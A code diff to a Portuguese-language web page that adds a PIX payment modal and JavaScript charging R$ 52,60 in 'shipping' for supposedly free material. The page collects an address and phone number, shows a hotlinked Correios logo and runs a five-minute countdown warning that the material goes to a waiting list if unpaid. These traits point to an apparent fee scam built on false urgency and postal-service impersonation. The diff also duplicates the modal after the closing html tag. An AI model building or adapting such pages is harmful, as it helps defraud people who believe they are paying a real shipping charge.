@@ -379,10 +379,96 @@
                             </div>
                             
                             <div class="flex justify-center">
-                                <button type="submit" id="submit-button" class="btn-primary py-3 px-6 rounded-md flex items-center">
+                                <button type="button" id="submit-button" class="btn-primary py-3 px-6 rounded-md flex items-center" onclick="processarPagamentoFrete()">
                                     <i class="fas fa-truck mr-2"></i>
                                     Confirmar Endereço e Pagar Frete
                                 </button>
+                            </div>
+                            
+                            <!-- Modal de Pagamento PIX -->
+                            <div id="pixModal" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center hidden z-50">
+                                <div class="bg-white w-[95%] max-w-4xl p-6 rounded-lg shadow-xl">
+                                    <div class="flex justify-between items-center mb-4">
+                                        <h3 class="text-xl font-bold">Pagamento do Frete via PIX</h3>
+                                        <button type="button" class="text-gray-500 hover:text-gray-700" onclick="closePixModal()">
+                                            <i class="fas fa-times text-xl"></i>
+                                        </button>
+                                    </div>
+                                    
+                                    <!-- Logo e Informações dos Correios -->
+                                    <div class="flex flex-col md:flex-row items-center mb-6 bg-blue-50 p-4 rounded-lg">
+                                        <img src="https://i0.wp.com/assets.b9.com.br/wp-content/uploads/2014/05/correios1.jpg?fit=769%2C192&ssl=1" 
+                                             alt="Correios" class="h-16 mb-4 md:mb-0 md:mr-4">
+                                        <div>
+                                            <p class="font-semibold text-blue-800">Frete SEDEX</p>
+                                            <p class="text-sm text-gray-600">Seu material será enviado pelos Correios e chegará em até 4 dias úteis após a confirmação do pagamento.</p>
+                                        </div>
+                                    </div>
+                                    
+                                    <!-- Aviso de Urgência -->
+                                    <div class="mb-6 bg-red-50 p-4 rounded-lg text-red-700 border border-red-200">
+                                        <p class="font-bold mb-2"><i class="fas fa-exclamation-triangle mr-2"></i> ATENÇÃO!</p>
+                                        <p>Se o pagamento não for realizado em até <span class="font-bold">5 minutos</span>, o material gratuito será cancelado e devolvido, sendo enviado para outro participante na lista de espera.</p>
+                                    </div>
+                                    
+                                    <!-- Contador Regressivo -->
+                                    <div class="text-center mb-6">
+                                        <p class="text-sm text-gray-600">Tempo restante para pagamento:</p>
+                                        <div id="countdown" class="text-2xl font-bold text-red-600">05:00</div>
+                                    </div>
+                                    
+                                    <div id="pixLoading" class="flex flex-col items-center justify-center py-10">
+                                        <div class="animate-spin h-10 w-10 border-4 border-blue-500 rounded-full border-t-transparent mb-4"></div>
+                                        <p class="text-gray-600">Gerando código PIX, aguarde...</p>
+                                    </div>
+                                    
+                                    <div id="pixContent" class="hidden flex flex-col items-center">
+                                        <!-- QR Code PIX -->
+                                        <div class="mb-4 border p-4 rounded-lg">
+                                            <img id="pixQrCode" src="" alt="QR Code PIX" class="mx-auto w-48 h-48">
+                                        </div>
+                                        
+                                        <!-- Código PIX para copiar -->
+                                        <div class="mb-6 w-full max-w-md">
+                                            <p class="text-sm mb-2 text-gray-600 text-center">Ou copie o código PIX abaixo:</p>
+                                            <div class="relative">
+                                                <input id="pixCodeText" type="text" readonly 
+                                                    class="w-full border border-gray-300 p-3 pr-12 rounded-md bg-gray-50 text-sm"
+                                                    value="">
+                                                <button id="copyPixCodeBtn" class="absolute right-2 top-1/2 transform -translate-y-1/2 text-blue-600 hover:text-blue-800"
+                                                    onclick="copyPixCode()">
+                                                    <i class="fas fa-copy"></i>
+                                                </button>
+                                            </div>
+                                            <p id="copyMessage" class="text-green-600 text-sm mt-1 text-center hidden">
+                                                Código PIX copiado com sucesso!
+                                            </p>
+                                        </div>
+                                        
+                                        <div class="mb-4 text-center">
+                                            <p class="text-gray-600 mb-2">Valor a pagar: <span class="font-bold">R$ 52,60</span></p>
+                                            <p class="text-sm text-gray-500">Faça o pagamento pelo aplicativo do seu banco usando o QR Code ou código PIX acima.</p>
+                                        </div>
+                                        
+                                        <div class="text-center mb-6" id="paymentStatusMessage">
+                                            <p class="text-gray-600">Após o pagamento, aguarde alguns instantes para a confirmação.</p>
+                                        </div>
+                                    </div>
+                                    
+                                    <div id="pixError" class="hidden text-center text-red-600 py-6">
+                                        <i class="fas fa-exclamation-circle text-3xl mb-2"></i>
+                                        <p id="pixErrorMessage">Ocorreu um erro ao gerar o pagamento. Por favor, tente novamente.</p>
+                                    </div>
+                                    
+                                    <!-- Botões de Ação -->
+                                    <div class="flex justify-center space-x-4 mt-4">
+                                        <button type="button" class="bg-gray-300 hover:bg-gray-400 text-gray-800 py-2 px-4 rounded"
+                                                onclick="closePixModal()">Cancelar</button>
+                                        <button type="button" id="verificarPagamentoBtn" class="bg-green-600 hover:bg-green-700 text-white py-2 px-4 rounded hidden">
+                                            Já paguei
+                                        </button>
+                                    </div>
+                                </div>
                             </div>
                         </form>
                     </div>
@@ -413,3 +499,312 @@
     </footer>
 </body>
 </html>
+
+<!-- Modal de Pagamento PIX -->
+<div id="pixModal" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center hidden z-50">
+    <div class="bg-white w-[95%] max-w-4xl p-6 rounded-lg shadow-xl">
+        <div class="flex justify-between items-center mb-4">
+            <h3 class="text-xl font-bold">Pagamento do Frete via PIX</h3>
+            <button type="button" class="text-gray-500 hover:text-gray-700" onclick="closePixModal()">
+                <i class="fas fa-times text-xl"></i>
+            </button>
+        </div>
+        
+        <!-- Logo e Informações dos Correios -->
+        <div class="flex flex-col md:flex-row items-center mb-6 bg-blue-50 p-4 rounded-lg">
+            <img src="https://i0.wp.com/assets.b9.com.br/wp-content/uploads/2014/05/correios1.jpg?fit=769%2C192&ssl=1" 
+                 alt="Correios" class="h-16 mb-4 md:mb-0 md:mr-4">
+            <div>
+                <p class="font-semibold text-blue-800">Frete SEDEX</p>
+                <p class="text-sm text-gray-600">Seu material será enviado pelos Correios e chegará em até 4 dias úteis após a confirmação do pagamento.</p>
+            </div>
+        </div>
+        
+        <!-- Aviso de Urgência -->
+        <div class="mb-6 bg-red-50 p-4 rounded-lg text-red-700 border border-red-200">
+            <p class="font-bold mb-2"><i class="fas fa-exclamation-triangle mr-2"></i> ATENÇÃO!</p>
+            <p>Se o pagamento não for realizado em até <span class="font-bold">5 minutos</span>, o material gratuito será cancelado e devolvido, sendo enviado para outro participante na lista de espera.</p>
+        </div>
+        
+        <!-- Contador Regressivo -->
+        <div class="text-center mb-6">
+            <p class="text-sm text-gray-600">Tempo restante para pagamento:</p>
+            <div id="countdown" class="text-2xl font-bold text-red-600">05:00</div>
+        </div>
+        
+        <div id="pixLoading" class="flex flex-col items-center justify-center py-10">
+            <div class="animate-spin h-10 w-10 border-4 border-blue-500 rounded-full border-t-transparent mb-4"></div>
+            <p class="text-gray-600">Gerando código PIX, aguarde...</p>
+        </div>
+        
+        <div id="pixContent" class="hidden flex flex-col items-center">
+            <!-- QR Code PIX -->
+            <div class="mb-4 border p-4 rounded-lg">
+                <img id="pixQrCode" src="" alt="QR Code PIX" class="mx-auto w-48 h-48">
+            </div>
+            
+            <!-- Código PIX para copiar -->
+            <div class="mb-6 w-full max-w-md">
+                <p class="text-sm mb-2 text-gray-600 text-center">Ou copie o código PIX abaixo:</p>
+                <div class="relative">
+                    <input id="pixCodeText" type="text" readonly 
+                        class="w-full border border-gray-300 p-3 pr-12 rounded-md bg-gray-50 text-sm"
+                        value="">
+                    <button id="copyPixCodeBtn" class="absolute right-2 top-1/2 transform -translate-y-1/2 text-blue-600 hover:text-blue-800"
+                        onclick="copyPixCode()">
+                        <i class="fas fa-copy"></i>
+                    </button>
+                </div>
+                <p id="copyMessage" class="text-green-600 text-sm mt-1 text-center hidden">
+                    Código PIX copiado com sucesso!
+                </p>
+            </div>
+            
+            <div class="mb-4 text-center">
+                <p class="text-gray-600 mb-2">Valor a pagar: <span class="font-bold">R$ 52,60</span></p>
+                <p class="text-sm text-gray-500">Faça o pagamento pelo aplicativo do seu banco usando o QR Code ou código PIX acima.</p>
+            </div>
+            
+            <div class="text-center mb-6" id="paymentStatusMessage">
+                <p class="text-gray-600">Após o pagamento, aguarde alguns instantes para a confirmação.</p>
+            </div>
+        </div>
+        
+        <div id="pixError" class="hidden text-center text-red-600 py-6">
+            <i class="fas fa-exclamation-circle text-3xl mb-2"></i>
+            <p id="pixErrorMessage">Ocorreu um erro ao gerar o pagamento. Por favor, tente novamente.</p>
+        </div>
+        
+        <!-- Botões de Ação -->
+        <div class="flex justify-center space-x-4 mt-4">
+            <button type="button" class="bg-gray-300 hover:bg-gray-400 text-gray-800 py-2 px-4 rounded"
+                    onclick="closePixModal()">Cancelar</button>
+            <button type="button" id="verificarPagamentoBtn" class="bg-green-600 hover:bg-green-700 text-white py-2 px-4 rounded hidden">
+                Já paguei
+            </button>
+        </div>
+    </div>
+</div>
+
+<script>
+    // Variáveis globais para controle do pagamento
+    let transactionId = null;
+    let countdownInterval = null;
+    let paymentCheckInterval = null;
+    
+    // Inicializar o formulário
+    document.addEventListener('DOMContentLoaded', function() {
+        // Só mudar o botão para type="button"
+        document.getElementById('submit-button').type = 'button';
+        document.getElementById('submit-button').setAttribute('onclick', 'processarPagamentoFrete()');
+        
+        // Inicializar botões
+        document.getElementById('copyPixCodeBtn').addEventListener('click', copyPixCode);
+        document.getElementById('verificarPagamentoBtn').addEventListener('click', verificarPagamentoManual);
+    });
+    
+    // Função para processar o pagamento do frete
+    function processarPagamentoFrete() {
+        // Validar o formulário
+        const requiredFields = ['cep', 'logradouro', 'numero', 'bairro', 'cidade', 'uf', 'telefone'];
+        let isValid = true;
+        let invalidFields = [];
+        
+        requiredFields.forEach(field => {
+            const input = document.getElementById(field);
+            if (!input.value.trim()) {
+                isValid = false;
+                input.classList.add('border-red-500');
+                invalidFields.push(field);
+            } else {
+                input.classList.remove('border-red-500');
+            }
+        });
+        
+        if (!isValid) {
+            alert('Por favor, preencha todos os campos obrigatórios: ' + invalidFields.join(', '));
+            return;
+        }
+        
+        // Abrir o modal
+        openPixModal();
+        
+        // Iniciar contador regressivo
+        startCountdown(5 * 60); // 5 minutos em segundos
+        
+        // Preparar dados para o pagamento
+        const telefone = document.getElementById('telefone').value;
+        
+        // Fazer solicitação para criar o pagamento do frete
+        fetch('/pagar-frete', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ telefone: telefone })
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.success) {
+                transactionId = data.transaction_id;
+                
+                // Mostrar o QR Code e código PIX
+                document.getElementById('pixQrCode').src = data.pixQrCode;
+                document.getElementById('pixCodeText').value = data.pixCode;
+                
+                // Esconder o loading e mostrar o conteúdo
+                document.getElementById('pixLoading').classList.add('hidden');
+                document.getElementById('pixContent').classList.remove('hidden');
+                document.getElementById('verificarPagamentoBtn').classList.remove('hidden');
+                
+                // Iniciar verificação automática do pagamento
+                startPaymentCheck();
+            } else {
+                showPixError(data.error || 'Não foi possível gerar o pagamento. Tente novamente.');
+            }
+        })
+        .catch(error => {
+            console.error('Erro ao criar pagamento:', error);
+            showPixError('Erro de conexão ao gerar o pagamento. Tente novamente.');
+        });
+    }
+    
+    // Função para iniciar a verificação automática do pagamento
+    function startPaymentCheck() {
+        // Verificar a cada 5 segundos
+        paymentCheckInterval = setInterval(() => {
+            checkPaymentStatus();
+        }, 5000);
+    }
+    
+    // Função para verificar o status do pagamento
+    function checkPaymentStatus() {
+        if (!transactionId) return;
+        
+        fetch('/verificar-pagamento-frete', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ transactionId: transactionId })
+        })
+        .then(response => response.json())
+        .then(data => {
+            console.log('Resposta da verificação de pagamento:', data);
+            
+            if (data.success) {
+                if (data.status === 'completed') {
+                    // Pagamento aprovado
+                    clearInterval(paymentCheckInterval);
+                    clearInterval(countdownInterval);
+                    
+                    // Mostrar mensagem de sucesso
+                    document.getElementById('paymentStatusMessage').innerHTML = `
+                        <div class="bg-green-100 p-4 rounded-lg text-green-800">
+                            <p class="font-bold"><i class="fas fa-check-circle mr-2"></i> Pagamento aprovado!</p>
+                            <p class="text-sm">O material será enviado em até 4 dias úteis.</p>
+                        </div>
+                    `;
+                    
+                    // Desabilitar o botão de verificação
+                    document.getElementById('verificarPagamentoBtn').disabled = true;
+                    document.getElementById('verificarPagamentoBtn').classList.add('bg-green-300');
+                    document.getElementById('verificarPagamentoBtn').classList.remove('bg-green-600', 'hover:bg-green-700');
+                    document.getElementById('verificarPagamentoBtn').textContent = 'Pagamento Confirmado';
+                    
+                    // Redirecionar após 3 segundos
+                    setTimeout(() => {
+                        window.location.href = '/';
+                    }, 3000);
+                }
+            } else {
+                console.error('Erro ao verificar pagamento:', data.error);
+            }
+        })
+        .catch(error => {
+            console.error('Erro de conexão ao verificar pagamento:', error);
+        });
+    }
+    
+    // Função para verificar o pagamento manualmente (botão "Já paguei")
+    function verificarPagamentoManual() {
+        checkPaymentStatus();
+        // Mostrar mensagem de verificação
+        document.getElementById('paymentStatusMessage').innerHTML = `
+            <div class="bg-blue-100 p-4 rounded-lg text-blue-800">
+                <p><i class="fas fa-spinner fa-spin mr-2"></i> Verificando pagamento...</p>
+            </div>
+        `;
+    }
+    
+    // Função para copiar o código PIX
+    function copyPixCode() {
+        const pixCodeText = document.getElementById('pixCodeText');
+        pixCodeText.select();
+        document.execCommand('copy');
+        
+        // Mostrar mensagem de copiado
+        const copyMessage = document.getElementById('copyMessage');
+        copyMessage.classList.remove('hidden');
+        
+        // Esconder a mensagem após 3 segundos
+        setTimeout(() => {
+            copyMessage.classList.add('hidden');
+        }, 3000);
+    }
+    
+    // Função para abrir o modal de PIX
+    function openPixModal() {
+        document.getElementById('pixModal').classList.remove('hidden');
+        document.getElementById('pixLoading').classList.remove('hidden');
+        document.getElementById('pixContent').classList.add('hidden');
+        document.getElementById('pixError').classList.add('hidden');
+        document.getElementById('verificarPagamentoBtn').classList.add('hidden');
+    }
+    
+    // Função para fechar o modal de PIX
+    function closePixModal() {
+        document.getElementById('pixModal').classList.add('hidden');
+        
+        // Limpar intervalos
+        if (countdownInterval) clearInterval(countdownInterval);
+        if (paymentCheckInterval) clearInterval(paymentCheckInterval);
+    }
+    
+    // Função para mostrar erro no modal
+    function showPixError(message) {
+        document.getElementById('pixLoading').classList.add('hidden');
+        document.getElementById('pixContent').classList.add('hidden');
+        document.getElementById('pixError').classList.remove('hidden');
+        document.getElementById('pixErrorMessage').textContent = message;
+    }
+    
+    // Função para iniciar o contador regressivo
+    function startCountdown(duration) {
+        let timer = duration;
+        const countdownElement = document.getElementById('countdown');
+        
+        // Limpar intervalo anterior se existir
+        if (countdownInterval) clearInterval(countdownInterval);
+        
+        countdownInterval = setInterval(() => {
+            const minutes = parseInt(timer / 60, 10);
+            const seconds = parseInt(timer % 60, 10);
+            
+            countdownElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+            
+            if (--timer < 0) {
+                clearInterval(countdownInterval);
+                countdownElement.textContent = '00:00';
+                
+                // Mostrar mensagem de tempo esgotado
+                document.getElementById('paymentStatusMessage').innerHTML = `
+                    <div class="bg-red-100 p-4 rounded-lg text-red-800">
+                        <p class="font-bold"><i class="fas fa-exclamation-circle mr-2"></i> Tempo esgotado!</p>
+                        <p class="text-sm">O material foi cancelado. Feche esta janela e tente novamente.</p>
+                    </div>
+                `;
+            }
+        }, 1000);
+    }
+</script>
